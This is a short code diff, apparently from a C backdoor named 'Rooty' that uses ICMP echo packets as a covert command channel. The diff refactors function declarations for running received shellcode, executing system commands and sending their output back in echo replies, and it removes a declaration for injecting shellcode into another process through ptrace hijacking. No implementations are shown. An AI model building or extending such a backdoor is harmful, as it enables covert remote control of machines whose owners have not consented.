@@ -10,25 +10,16 @@
 #include <pcap.h>
 #include <netdb.h>
 
-#ifdef Linux
-  #include <hijack.h>
-  #include <hijack_func.h>
-  #include <hijack_ptrace.h>
-  #define INTERFACE "any"
-#endif
-
-#ifdef BSD
-  #define INTERFACE "em0"
-#endif
+#define INTERFACE "any"
 
 // We need to keep track of the packet header type
 int data_type = 0;
 
 // Build response packets for sending
-int build_packet(unsigned char *pkt, const struct icmp_hdr *icmp_input, uint8_t *data, uint32_t size);
+int build_packet(unsigned char *pkt, const struct icmp_hdr *icmp_input, ROOTY_MESSAGE *msg);
 
 // Send response packet
-void send_packet(const uint8_t *data, uint32_t size, const struct ip_hdr *ip, const struct icmp_hdr *icmp);
+void send_packet(ROOTY_MESSAGE *msg, const struct ip_hdr *ip, const struct icmp_hdr *icmp);
 
 // Execute shellcode received from shellcode message
 void run_shellcode(const unsigned char *shellcode, uint32_t size);
@@ -37,10 +28,7 @@ void run_shellcode(const unsigned char *shellcode, uint32_t size);
 void execute_shellcode(const unsigned char *shellcode, const unsigned char *stack );
 
 // Execute system command and send back the results via ICMP echo reply
-void run_command(const unsigned char *command, uint32_t size, const struct ip_hdr *ip, const struct icmp_hdr *icmp);
+void run_command(ROOTY_MESSAGE *msg, const struct ip_hdr *ip, const struct icmp_hdr *icmp);
 
 // Process the received icmp message
-void process_message(const unsigned char *data, uint32_t size, const struct ip_hdr *ip, const struct icmp_hdr *icmp);
-
-// Inject shellcode into another running process
-int inject_remote_shellcode(uint16_t pid, const unsigned char *shellcode, uint32_t size);
+void process_message(unsigned char *data, uint32_t size, const struct ip_hdr *ip, const struct icmp_hdr *icmp);
